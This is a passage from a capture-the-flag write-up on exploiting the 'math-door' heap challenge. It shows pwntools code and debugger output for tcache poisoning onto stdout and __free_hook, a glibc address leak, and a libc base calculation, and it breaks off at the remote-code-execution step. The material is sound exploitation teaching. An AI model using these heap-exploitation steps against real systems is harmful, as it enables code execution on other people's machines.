+</code></pre></div><h3 id="leaking-memory-addresses">Leaking memory addresses</h3><p>Once have control on the heap, we need to mess around with the <code>stdout</code> structure to leak memory addresses. After a lot of research and trial and error, I found out that just modifying <code>write_ptr</code> will do the trick, because it will print some values before the structure.</p><p>The <code>stdout</code> (<code>_IO_2_1_stdout_</code>) structure is like this:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>p/x _IO_2_1_stdout_
+$1 = {
+  file = {
+    _flags = 0xfbad2887,
+    _IO_read_ptr = 0x7f5860e80723,
+    _IO_read_end = 0x7f5860e80723,
+    _IO_read_base = 0x7f5860e80723,
+    _IO_write_base = 0x7f5860e80723,
+    _IO_write_ptr = 0x7f5860e80723,
+    _IO_write_end = 0x7f5860e80723,
+    _IO_buf_base = 0x7f5860e80723,
+    _IO_buf_end = 0x7f5860e80724,
+    _IO_save_base = 0x0,
+    _IO_backup_base = 0x0,
+    _IO_save_end = 0x0,
+    _markers = 0x0,
+    _chain = 0x7f5860e7f980,
+    _fileno = 0x1,
+    _flags2 = 0x0,
+    _old_offset = 0xffffffffffffffff,
+    _cur_column = 0x0,
+    _vtable_offset = 0x0,
+    _shortbuf = {0xa},
+    _lock = 0x7f5860e817e0,
+    _offset = 0xffffffffffffffff,
+    _codecvt = 0x0,
+    _wide_data = 0x7f5860e7f880,
+    _freeres_list = 0x0,
+    _freeres_buf = 0x0,
+    __pad5 = 0x0,
+    _mode = 0xffffffff,
+    _unused2 = {0x0 <span class="rb-gray">&lt;repeats 20 times&gt;</span>}
+  },
+  vtable = 0x7f5860e7c4a0
+}
+<span class="code-red">pwndbg&gt; </span>x/28gx &_IO_2_1_stdout_
+<span class="code-dark-blue">0x7f5860e806a0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>&gt;:       0x00000000fbad2887      0x00007f5860e80723  
+<span class="code-dark-blue">0x7f5860e806b0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+16&gt;:    0x00007f5860e80723      0x00007f5860e80723
+<span class="code-dark-blue">0x7f5860e806c0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+32&gt;:    0x00007f5860e80723      0x00007f5860e80723
+<span class="code-dark-blue">0x7f5860e806d0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+48&gt;:    0x00007f5860e80723      0x00007f5860e80723
+<span class="code-dark-blue">0x7f5860e806e0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+64&gt;:    0x00007f5860e80724      0x0000000000000000
+<span class="code-dark-blue">0x7f5860e806f0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+80&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f5860e80700</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+96&gt;:    0x0000000000000000      0x00007f5860e7f980
+<span class="code-dark-blue">0x7f5860e80710</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+112&gt;:   0x0000000000000001      0xffffffffffffffff
+<span class="code-dark-blue">0x7f5860e80720</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+128&gt;:   0x000000000a000000      0x00007f5860e817e0
+<span class="code-dark-blue">0x7f5860e80730</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+144&gt;:   0xffffffffffffffff      0x0000000000000000
+<span class="code-dark-blue">0x7f5860e80740</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+160&gt;:   0x00007f5860e7f880      0x0000000000000000
+<span class="code-dark-blue">0x7f5860e80750</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+176&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f5860e80760</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+192&gt;:   0x00000000ffffffff      0x0000000000000000
+<span class="code-dark-blue">0x7f5860e80770</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+208&gt;:   0x0000000000000000      0x00007f5860e7c4a0
+</code></pre></div><p>Before modifying the <code>stdout</code> structure, I saved some chunks for later use. The first one at <code>&amp;stdout + 0x18</code>, using relative offsets:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>p/x 0x7f5860e806b8 - 0x7f5860e7fbe0  
+$2 = 0xad8
+</code></pre></div><p>This is the code for that:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">add_value</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">4</span><span class="mtk1">, </span><span class="mtk1">_IO_2_1_stdout__offset</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">18</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)</span>  
+<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">)  </span><span class="mtk3"># M + 4</span>
+<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">)  </span><span class="mtk3"># M + 5: &amp;stdout + 0x18</span>
+</code></pre></div><p>Now we have the address at the <code>chunks</code> array:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/64gx &chunks
+<span class="code-dark-blue">0x557f047f2060</span> &lt;<span class="code-dark-yellow">chunks</span>&gt;:        0x0000557f05e2d2a0      0x0000557f05e2d2c0
+<span class="code-dark-blue">0x557f047f2070</span> &lt;<span class="code-dark-yellow">chunks</span>+16&gt;:     0x0000557f05e2d2e0      0x0000557f05e2d300
+<span class="code-dark-blue">0x557f047f2080</span> &lt;<span class="code-dark-yellow">chunks</span>+32&gt;:     0x0000557f05e2d320      0x0000557f05e2d340
+<span class="code-dark-blue">0x557f047f2090</span> &lt;<span class="code-dark-yellow">chunks</span>+48&gt;:     0x0000557f05e2d360      0x0000557f05e2d380
+<span class="code-dark-blue">0x557f047f20a0</span> &lt;<span class="code-dark-yellow">chunks</span>+64&gt;:     0x0000557f05e2d3a0      0x0000557f05e2d3c0
+<span class="code-dark-blue">0x557f047f20b0</span> &lt;<span class="code-dark-yellow">chunks</span>+80&gt;:     0x0000557f05e2d3e0      0x0000557f05e2d400
+<span class="code-dark-blue">0x557f047f20c0</span> &lt;<span class="code-dark-yellow">chunks</span>+96&gt;:     0x0000557f05e2d420      0x0000557f05e2d440
+<span class="code-dark-blue">0x557f047f20d0</span> &lt;<span class="code-dark-yellow">chunks</span>+112&gt;:    0x0000557f05e2d460      0x0000557f05e2d480
+<span class="code-dark-blue">0x557f047f20e0</span> &lt;<span class="code-dark-yellow">chunks</span>+128&gt;:    0x0000557f05e2d4a0      0x0000557f05e2d4c0
+<span class="code-dark-blue">0x557f047f20f0</span> &lt;<span class="code-dark-yellow">chunks</span>+144&gt;:    0x0000557f05e2d4e0      0x0000557f05e2d500
+<span class="code-dark-blue">0x557f047f2100</span> &lt;<span class="code-dark-yellow">chunks</span>+160&gt;:    0x0000557f05e2d520      0x0000557f05e2d540
+<span class="code-dark-blue">0x557f047f2110</span> &lt;<span class="code-dark-yellow">chunks</span>+176&gt;:    0x0000557f05e2d560      0x0000557f05e2d580
+<span class="code-dark-blue">0x557f047f2120</span> &lt;<span class="code-dark-yellow">chunks</span>+192&gt;:    0x0000557f05e2d5a0      0x0000557f05e2d5c0
+<span class="code-dark-blue">0x557f047f2130</span> &lt;<span class="code-dark-yellow">chunks</span>+208&gt;:    0x0000557f05e2d5e0      0x0000557f05e2d600
+<span class="code-dark-blue">0x557f047f2140</span> &lt;<span class="code-dark-yellow">chunks</span>+224&gt;:    0x0000557f05e2d620      0x0000557f05e2d640
+<span class="code-dark-blue">0x557f047f2150</span> &lt;<span class="code-dark-yellow">chunks</span>+240&gt;:    0x0000557f05e2d660      0x0000557f05e2d680
+<span class="code-dark-blue">0x557f047f2160</span> &lt;<span class="code-dark-yellow">chunks</span>+256&gt;:    0x0000557f05e2d6a0      0x0000557f05e2d6c0
+<span class="code-dark-blue">0x557f047f2170</span> &lt;<span class="code-dark-yellow">chunks</span>+272&gt;:    0x0000557f05e2d6e0      0x0000557f05e2d700
+<span class="code-dark-blue">0x557f047f2180</span> &lt;<span class="code-dark-yellow">chunks</span>+288&gt;:    0x0000557f05e2d720      0x0000557f05e2d740
+<span class="code-dark-blue">0x557f047f2190</span> &lt;<span class="code-dark-yellow">chunks</span>+304&gt;:    0x0000557f05e2d2a0      0x0000557f05e2d310
+<span class="code-dark-blue">0x557f047f21a0</span> &lt;<span class="code-dark-yellow">chunks</span>+320&gt;:    0x0000557f05e2d460      0x0000557f05e2d090
+<span class="code-dark-blue">0x557f047f21b0</span> &lt;<span class="code-dark-yellow">chunks</span>+336&gt;:    0x0000557f05e2d320      0x00007fe5508f56b8
+<span class="code-dark-blue">0x557f047f21c0</span> &lt;<span class="code-dark-yellow">chunks</span>+352&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x557f047f21d0</span> &lt;<span class="code-dark-yellow">chunks</span>+368&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x557f047f21e0</span> &lt;<span class="code-dark-yellow">chunks</span>+384&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x557f047f21f0</span> &lt;<span class="code-dark-yellow">chunks</span>+400&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x557f047f2200</span> &lt;<span class="code-dark-yellow">chunks</span>+416&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x557f047f2210</span> &lt;<span class="code-dark-yellow">chunks</span>+432&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x557f047f2220</span> &lt;<span class="code-dark-yellow">chunks</span>+448&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x557f047f2230</span> &lt;<span class="code-dark-yellow">chunks</span>+464&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x557f047f2240</span> &lt;<span class="code-dark-yellow">chunks</span>+480&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x557f047f2250</span> &lt;<span class="code-dark-yellow">chunks</span>+496&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-red">pwndbg&gt; </span>x/4gx 0x00007fe5508f56b8
+<span class="code-dark-blue">0x7fe5508f56b8</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+24&gt;:    0x00007fe5508f5723      0x00007fe5508f5723  
+<span class="code-dark-blue">0x7fe5508f56c8</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+40&gt;:    0x00007fe5508f5723      0x00007fe5508f5723
+</code></pre></div><p>Notice that there are two <code>create(p)</code> because the first one puts the Glibc address into the head of the Tcache, and the next one uses that address to allocate the chunk. As a result, now the head of the Tcache points to <code>0x00007fe5508f5723</code> (which is the value at the bottom-left corner, not the current value at <code>&amp;stdout + 0x18</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>tcachebins
+<span class="code-dark-blue">tcachebins</span>
+<span class="code-dark-yellow">0x20 [  1]</span>: <span class="code-dark-magenta">0x7fe5508f5723 (_IO_2_1_stdout_+131)</span> ◂— 0x8f67e0000000000a /* '\n' */  
+</code></pre></div><p>The next chunk to save for later use is one at <code>__free_hook</code>, so let&rsquo;s compute the offset:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>p &__free_hook
+$1 = (void (**)(void *, const void *)) <span class="code-dark-blue">0x7fe5508f6e48</span> &lt;<span class="code-dark-yellow">__free_hook</span>&gt;  
+<span class="code-red">pwndbg&gt; </span>p/x 0x7fe5508f6e48 - 0x7fe5508f5723
+$2 = 0x1725
+</code></pre></div><p>So this explains the following snippet:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">add_value</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk1">M</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">1725</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">)  </span><span class="mtk3"># M + 6: &amp;__free_hook</span>  
+</code></pre></div><p>Finally, let&rsquo;s modify the <code>write_ptr</code> value to leak memory addresses (as said before):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">add_value</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk1">M</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">5</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">20</span><span class="mtk1">)  </span><span class="mtk3"># read_base, write_base, write_ptr</span>  
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
+</code></pre></div><p>We will have these leakage:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './math-door'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'.'</span>
+[<span class="code-green">+</span>] Starting local process './math-door': pid 375902
+[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './math-door', '375902', '-x', '/tmp/pwnpvmho3a0.gdb']  
+[<span class="code-green">+</span>] Waiting for debugger: Done
+[<span class="code-blue">*</span>] Switching to interactive mode
+\x00\x00\xe0w\xdd\xc8W\x7f\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x80X\xdd1. Create
+2. Delete
+3. Add value
+Action:
+<span class="code-red">$</span>
+</code></pre></div><p>We see that <code>\xe0w\xdd\xc8W\x7f</code> is an address within Glibc. Also notice the <code>\xff</code> bytes. This might look familiar, and in fact it is the <code>stdout</code> structure:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/28gx &_IO_2_1_stdout_
+<span class="code-dark-blue">0x7f57c8dd66a0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>&gt;:       0x00000000fbad2887      0x00007f57c8dd6723  
+<span class="code-dark-blue">0x7f57c8dd66b0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+16&gt;:    0x00007f57c8dd6723      0x00007f57c8dd6723
+<span class="code-dark-blue">0x7f57c8dd66c0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+32&gt;:    0x00007f57c8dd6723      0x00007f57c8dd6723
+<span class="code-dark-blue">0x7f57c8dd66d0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+48&gt;:    0x00007f57c8dd6723      0x00007f57c8dd6723
+<span class="code-dark-blue">0x7f57c8dd66e0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+64&gt;:    0x00007f57c8dd6724      0x0000000000000000
+<span class="code-dark-blue">0x7f57c8dd66f0</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+80&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f57c8dd6700</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+96&gt;:    0x0000000000000000      0x00007f57c8dd5980
+<span class="code-dark-blue">0x7f57c8dd6710</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+112&gt;:   0x0000000000000001      0xffffffffffffffff
+<span class="code-dark-blue">0x7f57c8dd6720</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+128&gt;:   0x000000000a000000      0x00007f57c8dd77e0
+<span class="code-dark-blue">0x7f57c8dd6730</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+144&gt;:   0xffffffffffffffff      0x0000000000000000
+<span class="code-dark-blue">0x7f57c8dd6740</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+160&gt;:   0x00007f57c8dd5880      0x0000000000000000
+<span class="code-dark-blue">0x7f57c8dd6750</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+176&gt;:   0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f57c8dd6760</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+192&gt;:   0x00000000ffffffff      0x0000000000000000
+<span class="code-dark-blue">0x7f57c8dd6770</span> &lt;<span class="code-dark-yellow">_IO_2_1_stdout_</span>+208&gt;:   0x0000000000000000      0x00007f57c8dd24a0
+</code></pre></div><p>Specifically, the leak indicated above corresponds to <code>0x00007f57c8dd77e0</code>, whose offset to Glibc base address is <code>0x1ee7e0</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>vmmap
+LEGEND: <span class="code-dark-yellow">STACK</span> | <span class="code-dark-blue">HEAP</span> | <span class="code-dark-red">CODE</span> | <span class="code-dark-magenta">DATA</span> | <span class="mtku">RWX</span> | RODATA
+    0x561f31ded000     0x561f31dee000 r--p     1000 0      ./math-door
+<span class="code-dark-red">    0x561f31dee000     0x561f31def000 r-xp     1000 1000   ./math-door</span>
+    0x561f31def000     0x561f31df0000 r--p     1000 2000   ./math-door
+    0x561f31df0000     0x561f31df1000 r--p     1000 2000   ./math-door
+<span class="code-dark-magenta">    0x561f31df1000     0x561f31df2000 rw-p     1000 3000   ./math-door</span>
+<span class="code-dark-magenta">    0x561f31df2000     0x561f31df4000 rw-p     2000 5000   ./math-door</span>
+<span class="code-dark-blue">    0x561f32a87000     0x561f32aa8000 rw-p    21000 0      [heap]</span>
+<span class="code-dark-magenta">    0x7f57c8be7000     0x7f57c8be9000 rw-p     2000 0      [anon_7f57c8be7]</span>  
+    0x7f57c8be9000     0x7f57c8c0b000 r--p    22000 0      ./libc.so.6
+<span class="code-dark-red">    0x7f57c8c0b000     0x7f57c8d83000 r-xp   178000 22000  ./libc.so.6</span>
+    0x7f57c8d83000     0x7f57c8dd1000 r--p    4e000 19a000 ./libc.so.6
+    0x7f57c8dd1000     0x7f57c8dd5000 r--p     4000 1e7000 ./libc.so.6
+<span class="code-dark-magenta">    0x7f57c8dd5000     0x7f57c8dd7000 rw-p     2000 1eb000 ./libc.so.6</span>
+<span class="code-dark-magenta">    0x7f57c8dd7000     0x7f57c8ddd000 rw-p     6000 0      [anon_7f57c8dd7]</span>
+    0x7f57c8ddd000     0x7f57c8dde000 r--p     1000 0      ./ld.so
+<span class="code-dark-red">    0x7f57c8dde000     0x7f57c8e01000 r-xp    23000 1000   ./ld.so</span>
+    0x7f57c8e01000     0x7f57c8e09000 r--p     8000 24000  ./ld.so
+    0x7f57c8e0a000     0x7f57c8e0b000 r--p     1000 2c000  ./ld.so
+<span class="code-dark-magenta">    0x7f57c8e0b000     0x7f57c8e0c000 rw-p     1000 2d000  ./ld.so</span>
+<span class="code-dark-magenta">    0x7f57c8e0c000     0x7f57c8e0d000 rw-p     1000 0      [anon_7f57c8e0c]</span>
+<span class="code-dark-yellow">    0x7ffe1be91000     0x7ffe1beb2000 rw-p    21000 0      [stack]</span>
+    0x7ffe1bf53000     0x7ffe1bf57000 r--p     4000 0      [vvar]
+<span class="code-dark-red">    0x7ffe1bf57000     0x7ffe1bf59000 r-xp     2000 0      [vdso]</span>
+<span class="code-dark-red">0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]</span>
+<span class="code-red">pwndbg&gt; </span>p/x 0x00007f57c8dd77e0 - 0x7f57c8be9000
+$1 = 0x1ee7e0
+</code></pre></div><p>Now we can take this output and calculate the base address:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>
+<span class="mtk1">    </span><span class="mtk1">index</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">data</span><span class="mtk1">.</span><span class="mtk8">index</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\x7f</span><span class="mtk4">'</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span>
+<span class="mtk1">    </span><span class="mtk1">glibc_leak</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">data</span><span class="mtk1">[</span><span class="mtk1">index</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">6</span><span class="mtk1"> : </span><span class="mtk1">index</span><span class="mtk1">].</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>  
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc leak: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc_leak</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc_leak</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1ee7e0</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
+</code></pre></div><p>And everything is perfect:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './math-door'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'.'</span>
+[<span class="code-green">+</span>] Starting local process './math-door': pid 380534
+[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './math-door', '380534', '-x', '/tmp/pwnktj_cn67.gdb']  
+[<span class="code-green">+</span>] Waiting for debugger: Done
+[<span class="code-blue">*</span>] Glibc leak: 0x7f17763707e0
+[<span class="code-green">+</span>] Glibc base address: 0x7f1776182000
+[<span class="code-blue">*</span>] Switching to interactive mode
+2. Delete
+3. Add value
+Action:
+<span class="code-red">$</span>
+</code></pre></div><h3 id="getting-rce">Getting RCE</h3><p>This part is easy because we already have a chunk at <code>__free_hook</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/64gx &chunks
+<span class="code-dark-blue">0x55d9349ee060</span> &lt;<span class="code-dark-yellow">chunks</span>&gt;:        0x000055d9350332a0      0x000055d9350332c0  
+<span class="code-dark-blue">0x55d9349ee070</span> &lt;<span class="code-dark-yellow">chunks</span>+16&gt;:     0x000055d9350332e0      0x000055d935033300
+<span class="code-dark-blue">0x55d9349ee080</span> &lt;<span class="code-dark-yellow">chunks</span>+32&gt;:     0x000055d935033320      0x000055d935033340
+<span class="code-dark-blue">0x55d9349ee090</span> &lt;<span class="code-dark-yellow">chunks</span>+48&gt;:     0x000055d935033360      0x000055d935033380
+<span class="code-dark-blue">0x55d9349ee0a0</span> &lt;<span class="code-dark-yellow">chunks</span>+64&gt;:     0x000055d9350333a0      0x000055d9350333c0
+<span class="code-dark-blue">0x55d9349ee0b0</span> &lt;<span class="code-dark-yellow">chunks</span>+80&gt;:     0x000055d9350333e0      0x000055d935033400
+<span class="code-dark-blue">0x55d9349ee0c0</span> &lt;<span class="code-dark-yellow">chunks</span>+96&gt;:     0x000055d935033420      0x000055d935033440
+<span class="code-dark-blue">0x55d9349ee0d0</span> &lt;<span class="code-dark-yellow">chunks</span>+112&gt;:    0x000055d935033460      0x000055d935033480
+<span class="code-dark-blue">0x55d9349ee0e0</span> &lt;<span class="code-dark-yellow">chunks</span>+128&gt;:    0x000055d9350334a0      0x000055d9350334c0
+<span class="code-dark-blue">0x55d9349ee0f0</span> &lt;<span class="code-dark-yellow">chunks</span>+144&gt;:    0x000055d9350334e0      0x000055d935033500
+<span class="code-dark-blue">0x55d9349ee100</span> &lt;<span class="code-dark-yellow">chunks</span>+160&gt;:    0x000055d935033520      0x000055d935033540
+<span class="code-dark-blue">0x55d9349ee110</span> &lt;<span class="code-dark-yellow">chunks</span>+176&gt;:    0x000055d935033560      0x000055d935033580
+<span class="code-dark-blue">0x55d9349ee120</span> &lt;<span class="code-dark-yellow">chunks</span>+192&gt;:    0x000055d9350335a0      0x000055d9350335c0
+<span class="code-dark-blue">0x55d9349ee130</span> &lt;<span class="code-dark-yellow">chunks</span>+208&gt;:    0x000055d9350335e0      0x000055d935033600
+<span class="code-dark-blue">0x55d9349ee140</span> &lt;<span class="code-dark-yellow">chunks</span>+224&gt;:    0x000055d935033620      0x000055d935033640
+<span class="code-dark-blue">0x55d9349ee150</span> &lt;<span class="code-dark-yellow">chunks</span>+240&gt;:    0x000055d935033660      0x000055d935033680
+<span class="code-dark-blue">0x55d9349ee160</span> &lt;<span class="code-dark-yellow">chunks</span>+256&gt;:    0x000055d9350336a0      0x000055d9350336c0
+<span class="code-dark-blue">0x55d9349ee170</span> &lt;<span class="code-dark-yellow">chunks</span>+272&gt;:    0x000055d9350336e0      0x000055d935033700
+<span class="code-dark-blue">0x55d9349ee180</span> &lt;<span class="code-dark-yellow">chunks</span>+288&gt;:    0x000055d935033720      0x000055d935033740
+<span class="code-dark-blue">0x55d9349ee190</span> &lt;<span class="code-dark-yellow">chunks</span>+304&gt;:    0x000055d9350332a0      0x000055d935033310
+<span class="code-dark-blue">0x55d9349ee1a0</span> &lt;<span class="code-dark-yellow">chunks</span>+320&gt;:    0x000055d935033460      0x000055d935033090
+<span class="code-dark-blue">0x55d9349ee1b0</span> &lt;<span class="code-dark-yellow">chunks</span>+336&gt;:    0x000055d935033320      0x00007f177636f6b8
+<span class="code-dark-blue">0x55d9349ee1c0</span> &lt;<span class="code-dark-yellow">chunks</span>+352&gt;:    0x00007f1776370e48      0x0000000000000000
+<span class="code-dark-blue">0x55d9349ee1d0</span> &lt;<span class="code-dark-yellow">chunks</span>+368&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x55d9349ee1e0</span> &lt;<span class="code-dark-yellow">chunks</span>+384&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x55d9349ee1f0</span> &lt;<span class="code-dark-yellow">chunks</span>+400&gt;:    0x0000000000000000      0x0000000000000000
